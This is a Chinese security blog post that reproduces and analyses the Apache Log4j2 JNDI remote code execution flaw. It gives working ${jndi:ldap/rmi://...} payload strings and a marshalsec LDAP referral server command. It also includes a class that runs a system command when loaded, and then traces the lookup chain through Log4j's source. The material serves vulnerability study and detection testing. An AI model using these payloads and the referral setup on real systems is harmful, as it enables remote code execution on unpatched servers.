#  Apache Log4j2远程代码执行漏洞详解  
原创 三呼呼
                        三呼呼  古月安全   2026-04-17 01:38  
  
### 漏洞简介  
  
Apache Log4j2远程代码执行漏洞，影响版本‌：2.0 <= Log4j2 <= 2.14.1  
  
‌**核心机制**  
‌：  
  
利用jndi Lookup  
方法，通过${jndi:ldap://恶意URL}  
触发JNDI注入或者RMI远程对象引用。  
  
JNDI动态加载远程恶意类并执行（如LDAP/RMI协议）  
  
‌**触发条件**  
‌：  
  
用户输入的信息，被日志记录，且该信息未过滤（如登录日志中的用户名参数）  
  
**引入log4j库**  
  
首先新建一个Log4j的项目，通过maven导入log4j库：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn4a2IjC9TIDKia4m9NQicIH5Y0atpwROsUYoXeYGiaibTKQib4aTYhldhqoOjFk7h83ibZUHMxSP1p4fCVqpcI3BuHFPF8ibmM1dbTOicM/640?wx_fmt=other&from=appmsg "")  
### 漏洞复现一-----RMI利用：  
  
上面知道了JNDI通过RMI服务执行系统命令的方法，那么log4j又是怎么实现的呢：  
  
具体细节请看我的另外一个文章：[深入理解Fastjson反序列化漏洞-基础篇](https://mp.weixin.qq.com/s?__biz=Mzk5MDI5NDAyMw==&mid=2247484815&idx=1&sn=ae1ebbacdfe11cd15666902636d1dbb3&scene=21#wechat_redirect)  
  
  
首先还是上面文章中的关于JNDI介绍的两个类：我这里改下名字：将test类改成RMItest便于区分：代码不变，来复现一下漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn6FQjrzxM2Ria5Qo1FiaA2l9mic9e5PD76ibMFias0eVddZeKXXcXjrHwTCBVGUJ3FgCVqZIrj91FCNLwiaqagZUEJa3tFuPslbiaY6ib4/640?wx_fmt=other&from=appmsg "")  
  
log4j的服务端：如下，定义一个Logger对象记录日志，将构造的错误日志的内容写入：  
```
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class log4jTest {
    public static final Logger logger = LogManager.getLogger(log4jTest.class);
    public static void main(String[] args) {
        logger.error("${jndi:rmi://127.0.0.1:1099/RMItest}");
    }
}
```  
  
根据JNDI中一样，启动web服务，启动RMI服务：然后运行log4jTest 的代码即可：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn5MGI33KibMZdnsf9zKbia4PicebgRxj66EQduJImgA2gkWNnr55MpibwrcBw16u9BSPkC69UdsZhCibtccspXicxI7wz6ibl7YE7TW6s/640?wx_fmt=other&from=appmsg "")  
  
执行系统命令！详细分析在后面：  
### 漏洞复现二----LDAP利用：  
  
前面漏洞的核心机制已经了解到通过${jndi:ldap://恶意URL}  
触发JNDI注入，所以需要一个ldap服务端。LDAP（Lightweight Directory Access Protocol，轻量级目录访问协议）需要了解的可以看其他文章，这里便于理解，可以理解成一个供用户访问下载的文件目录。  
  
这里通过marshalsec这个工具创建LDAP服务，可到GitHub上下载：然后执行如下命令：  
  
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#calc 1099  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn5qg9yzRiaGsXaS24zcUicgl4wlQO98j2Ov28uhhllBvGBVIA0tOBiaZa8Zcte4aWgGBcNwPglTjT6pcLQQbwCCC7hiczpibwbcRAU0/640?wx_fmt=other&from=appmsg "")  
  
运行之后在1099端口监听。这样大概就是在本机的1099端口开启了一个LDAP服务，并且将http://127.0.0.1:8000/#calc 这个web服务引用到LDAP服务中，当用户请求到LDAP服务时，LDAP会返回包含远程加载类地址的对象，当前java应用就会根据这个地址主动发起HTTP请求下载这个类。  
  
现在就需要一个http://127.0.0.1:8000/#calc了，如下calc中测试代码，代码狠简单，有一个构造函数，直接执行系统命令，弹出计算器  
```
import java.io.IOException;
public class calc {
    public calc() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
```  
  
将其编译成.class文件。然后在.class文件目录下开启http服务，这里用python -m http.server 来启动，默认8000端口：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn6Dtt7QU6AXbszUwmwovXtklo6jP9mE0hWia1VP7COtDmmpfmiacrgA1SwVmcH1QLYqDKibbjZcTJicotSJxo6OJyEBax2ytUyUibaw/640?wx_fmt=other&from=appmsg "")  
  
现在在刚才的log4j项目中，使用Log4j框架初始化一个静态的日志记录器（Logger）实例，用于记录不同级别的日志信息（如DEBUG、INFO、ERROR等）：  
```
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class log4jTest {
    public static final Logger logger = LogManager.getLogger(log4jTest.class);//获取与当前类log4jTest绑定的日志记录器实例
    public static void main(String[] args) {
    logger.error("${jndi:ldap://127.0.0.1:1099/calc}");
    }
}
```  
  
然后在main方法中，记录日志，这里未配置直接输出到控制台：我们在日志记录中设计了一个字符串（使用了jndi方式访问LDAP服务），运行下直接弹出了计算器，说明calc类里面的构造方法被执行了：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn4KlVtDDFz8KNtpTFdntWvj1RqjicbKooy2D5N5QNFl6oRvxVwYu3w11LyW7N9JITWR3CnHvUjPQJ7ApVaL0nHjeHgxxwu6eBk4/640?wx_fmt=other&from=appmsg "")  
  
这中间到底发生了什么，看上去只是记录了一下错误日志，里面的字符串是我们精心设计的，却执行了系统命令。  
### 漏洞分析  
  
日志服务器是通过类加载器获取一个  
Logger对象  
：用来记录日志，通过调试看看最终的调用远程对象的地方：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn5GHTAPW7QsIj2HXGqqbYHqVZNvcQTYswVEib9u881lbntMT2s96qficVPr08H4nnscgXWDs7ibjxn7lWLol2c8OJAZ9vDvNMpoRI/640?wx_fmt=other&from=appmsg "")  
  
通过  
InitialContext的  
lookup调用远程对象。关于利用原理可以看[深入理解Fastjson反序列化漏洞-实战篇](https://mp.weixin.qq.com/s?__biz=Mzk5MDI5NDAyMw==&mid=2247484869&idx=1&sn=a552a75dbe989a32c355a71c50ed0b97&scene=21#wechat_redirect)  
系列文章。  
  
只要这里的getURLOrDefaultInitCtx(name)得到的是一个InitialContext ，就完成了一个JNDI的远程调用流程，从而在本地初始化远程对象，执行构造函数里面的方法。往前找 一下谁调用的这个lookup:  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn6EoNKcwnKAo2duZSRXzAgApUnr7BeMxFIeIUURAeMtS9ss7FURNibwqRQ1MM6n9Bgic3M2Yd4nzlUrRS4IHycySkyj4EYqUegYw/640?wx_fmt=other&from=appmsg "")  
  
这里的JndiManager.context属性，就是一个InitialContext  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn6ibNGvj8eVQjucs0mxME5icwRH0MeNGc5MEJBA7ZToc2diats8jE3zMtgAMzFKqoq1ekCYyo6xmGIDQjEIE6DQy0JKRiaZcSFOnSM/640?wx_fmt=other&from=appmsg "")  
  
那又是谁调用的这个lookup呢，JndiManager jndiManager = JndiManager.getDefaultManager())，原来是从这里得到一个InitialContext 对象的，然后调用lookup ，从而到了InitialContext lookup，进入到JNDI注入的流程：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn6tqI9Mhler1fM0Pjn0XvgdzIqFAwthTCYtZ2PkrnRMFtbuYVu63b939fZicLMk2nF2JfDa3uqMANHF3pXm47ibnEUBNdS90xz9k/640?wx_fmt=other&from=appmsg "")  
  
在向退一步：来自Interpolator这里的lookup：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn6Pia39iaX041XoFVHwJZ2DBvFQ1OWB6EPaQwIWZLzicsPaxhmCiaXlH0Pm2CPdqoAzc63qogkte8icqaJIOUCxrZEicQDCW85A3pQcA/640?wx_fmt=other&from=appmsg "")  
  
在后退一步：StrSubstitutor的**resolveVariable()方法中的**  
lookup方法调用：层层lookup调用，最终到InitialContext 的lookup：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn6Ch5y0DjiaNR8LKM8g5fz3RYcd8vqx2CvibO0H37QnG3Sy7d6HzB0vl7ZMR5xOlJ9llJ4ucXPPUYa6UX6fVqyOeh6siasS3Bbgyo/640?wx_fmt=other&from=appmsg "")  
  
**resolveVariable()方法**  
  
该方法主要是用于解析日志消息中的变量表达式（如${xxx}  
），比如我们传入的${jndi:ldap://127.0.0.1:1099/calc},什么意思呢，就是会将${xxx} 这种写法当成一个变量来解析：如果使用了分号，分号后面表示该变量的默认值。  
  
先看看效果：返回了java 的version值，就是将这里的花括号里面的字符串会解析成变量，然后将变量的值输出到日志中：不同的变量会解析为不同的解析器，当然执行的效果就是不一样的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn7AjE4k4DdBE3uOoON5vaz14pFGFGh4FLqsCudrUb3ic77E8u0jNuUswvRS0lmIiazoRQ3sgWpxhicCKXuzrjlhbIhaiaRVJOXt4Qc/640?wx_fmt=other&from=appmsg "")  
  
那么JNDI的具体怎么实现的我们到源代码里面去看看：  
  
就是它的lookup方法实现了具体细节：从这个private StrLookup variableResolver变量的定义可以看到系统内置的支持解析的变量有这些：包括上面的测试java  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn5IlySCdNxVKtpOs8iayJzFpzyqARExtMgKkLaP8gq9vkXD8vHGLZ4LsqDRnEHAQM4CT95n1V9qHgdWnxwQrQATpxGibdDfBoiaS8/640?wx_fmt=other&from=appmsg "")  
  
看看具体如何实现的：源代码如下：  
```
public String lookup(final LogEvent event, String var) {
    if (var == null) {
        return null;
    }
    final int prefixPos = var.indexOf(PREFIX_SEPARATOR);
    if (prefixPos >= 0) {
        final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US);
        final String name = var.substring(prefixPos + 1);
        final StrLookup lookup = strLookupMap.get(prefix);
        if (lookup instanceof ConfigurationAware) {
            ((ConfigurationAware) lookup).setConfiguration(configuration);
        }
        String value = null;
        if (lookup != null) {
            value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);
        }
        if (value != null) {
            return value;
        }
        var = var.substring(prefixPos + 1);
    }
    if (defaultLookup != null) {
        return event == null ? defaultLookup.lookup(var) : defaultLookup.lookup(event, var);
    }
    return null;
}
```  
  
将我们的传入的日志的值，通过            final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US);             final String name = var.substring(prefixPos + 1);用冒号:分隔，相当于将变量与值分开，得到了一个jndi字符串和ldap://127.0.0.1:1099/calc  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn5sJ4TzriatlYic1ldAYQ3IMbyJvCSh6rtCny1VJIbibtM0KeibRvuX5A6kcXLIqUWoLRD7otCytCU07wK4byxhkMzhEeW4bqt6Sz4/640?wx_fmt=other&from=appmsg "")  
  
final StrLookup lookup = strLookupMap.get(prefix); 然后从strLookupMap这个hashMap里面获取一个JndiLookup对象，这个map里面的值如下，是系统初始化的时候内置好的，不同的值对应不同的对象：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn42l5LZluBnaEBHa0icpZiaRXqiaHYBgK6r9Hm74iaob4VK4ibkM9A9yqIqbWnXSP5LKkOiaOsdGoVUoT1UeILPeic5CyEthj8ANfJI88/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn6oJVvMbb3NNgrhRial2PFlAyMGibRBiauBnH6JyXT3dBhNozQCiauia7baz8Fa7iamzq7ibOA4IDatOLIIovIeoEFX2HehzF1S2or5UY/640?wx_fmt=other&from=appmsg "")  
  
现在顺着这个路径往前走，接下来调用得到的lookup 的lookup方法，进入JndiLookup的lookup  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn5R43lAJBeMAwzmIrNib9AQia60cnowuia1p3oYr7Q5uXh6A5YUyicG9M2HcnBNQElv9JLeekZgo388v3hJO5L4DiawRNTmTBkPHnNI/640?wx_fmt=other&from=appmsg "")  
  
再它的方法里面有一个JndiManager.getDefaultManager()方法调用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn5rWSoib9AHl9o4cxBj6GmDhX2P0mxNVkC5nzPJ2NNCuCHblRWPmPSQpu0J1W7fw9C6bXrY3tItkSQxkbNfC4OAOYMEtq0Nwrl8/640?wx_fmt=other&from=appmsg "")  
```
public static JndiManager getDefaultManager() {
    return getManager(JndiManager.class.getName(), FACTORY, null);
}
```  
  
继续调用getManager，在它里面继续调用createManager  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn6nXysf81pI1qLrOIuRtDK0ESyiadvZwDqjSw8o001ibSJSK1hKeKvLia7RMYfmuiawQHA1mYRnkfiaFbN6oIJhM8LNImJ6FxhpY6dY/640?wx_fmt=other&from=appmsg "")  
  
在它的方法里面创建InitialContext对象，就是JNDI注入的关键对象：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn4veibdgZE5H8yLZSw3aHhctQ6ibwXJQAODibw4Qa6cnsXQXBHOsAh8wl60qt99xn0jWzU5o2vWPFr1OjAVJF85djGPgFNTX496Sw/640?wx_fmt=other&from=appmsg "")  
  
并且将其赋值给JndiManager对象的context属性  
```
private JndiManager(final String name, final Context context) {
    super(null, name);
    this.context = context;
}
```  
  
然后刚赋值完成，就紧接着调用了它自己的lookup方法：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn7EqlibWI5VLECqibgVagPAvDbw1oUiaicVdiauYswcwicmjXMrMpGqWBJejJSiaTxGdKSOj9C4zzRibib3vyzibOqrlml59bMFviat6icAeKY/640?wx_fmt=other&from=appmsg "")  
  
自己的lookup方法如下：  
```
public <T> T lookup(final String name) throws NamingException {
    return (T) this.context.lookup(name);
}
```  
  
立刻执行了刚赋值的context=InitialContext对象的lookup方法。从而通过JNDI的方式从远程LDAP服务端获取了恶意类对象。  
  
以上为关键触发流程！在前面就是对我们传入的内容进行一系列处理的过程。核心的地方跟fastJson漏洞的成因一样，都是利用InitialContext的lookup方法。  
  
====================================  
  
**写在最后的常见探测方式**  
  
而调用resolveVariable()，方法的是它自己的substitute()方法，该方法源代码较多可自行查看，其主要作用是将我们传入的参数，递归识别由前缀（默认${  
）和后缀（默认}  
）包裹的变量名，因为可能会出现变量嵌套的情况，这里就使用了递归调用substitute()方法，替换成前面的Map中对应的变量解析器：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn46VlpJibKVmbhCCnyHINd6uKRwT7icR4YIvibNZbR1AQ7RbUvuTqcjQLicIceC9WH7vkJ7gowibgrK6eOlnRUQb8k0BRTW6xDRnarI/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn6zpKEsj5cxZ6HOSYcLOwO2cULrOkap3ACHnrxUicwDCelQ1DibLEdpJqZ2rMtogN4PpvjY8KN5xBH7iau4nF3xfjoG1aHyiauLRNA/640?wx_fmt=other&from=appmsg "")  
  
实际测试过程中，我们经常会使用DNSLOG来测试，那么相当于将  logger.error("${jndi:ldap://127.0.0.1:1099/calc}");这里的ip改成对应的域名即可。如下测试：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn50m52JfK9M8NcpBxnCcw8DiaUOZiakibBjCVEk3mYxjO72Fcvk95qb6faLSibNkVuxPPFciapIZBgCR2lZx9Uq8DDSFpfQSR0584Es/640?wx_fmt=other&from=appmsg "")  
  
最上面的测试使用的error日志，也可以使用其他，比如info。但是如果是info可能默认没有开启，需要使用修改配置如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn7WqM4Txicok8vRxK6jMQYic7L0bJXYxFZOG4IYIibt8PBGDY5wJ5wRgqvFVDQsaDcemFgHqsicj0UHHJtDyk8jOO3vpLzWhrEJQyE/640?wx_fmt=other&from=appmsg "")  
  
